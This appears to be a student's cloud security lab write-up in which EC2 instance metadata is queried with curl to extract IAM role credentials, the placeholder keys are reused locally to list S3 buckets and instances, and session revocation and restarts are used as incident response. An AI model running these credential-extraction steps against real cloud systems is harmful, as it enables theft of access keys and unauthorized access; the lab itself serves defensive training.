# Module 4 – Domain 1: Threat Detection and Incident Response

## Lab Summary
Deployed a CloudFormation stack in the **Management** account that launched two EC2 instances for hands-on security testing.

---

## Exploitation Simulation

### Step 1 – Extract IAM Role Credentials from EC2
From within an EC2 instance:
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```
Retrieved:
- **Access Key**
- **Secret Key**
- **Session Token**

Example credentials retrieved during the lab:
```json
{
  "Code" : "Success",
  "LastUpdated" : "2025-08-07T06:28:23Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAEXAMPLE",
  "SecretAccessKey" : "EXAMPLESECRETKEY",
  "Token" : "EXAMPLETOKEN",
  "Expiration" : "2025-08-07T12:54:46Z"
}
```

---

### Step 2 – Use Stolen Credentials Locally

**Linux / macOS**
```bash
export AWS_ACCESS_KEY_ID=<ACCESS_KEY>
export AWS_SECRET_ACCESS_KEY=<SECRET_KEY>
export AWS_SESSION_TOKEN=<SESSION_TOKEN>
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

**Windows CMD**
```cmd
SET AWS_ACCESS_KEY_ID=<ACCESS_KEY>
SET AWS_SECRET_ACCESS_KEY=<SECRET_KEY>
SET AWS_SESSION_TOKEN=<SESSION_TOKEN>
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

---

### Step 3 – Validate Persistence of Credentials
- Stopped and started the EC2 instance.
- Repeated `curl` extraction to retrieve **new temporary credentials**.
- Confirmed attacker could regain access.

---

## Incident Response Actions
- Revoked all active sessions for the affected IAM role to **immediately invalidate stolen credentials**.
- Created and executed a script to revoke all sessions issued before the current timestamp.
- Forced all EC2 instances using the role to **stop and restart**, triggering issuance of secure new credentials.
- Mitigation completed **without removing IAM roles or permissions** required for legitimate workloads.

---

## Key Takeaways
- IMDSv1 can be exploited if EC2 instances are compromised.
- Temporary credentials can persist after stop/start unless revoked.
- Session revocation and resource restart are effective containment measures.
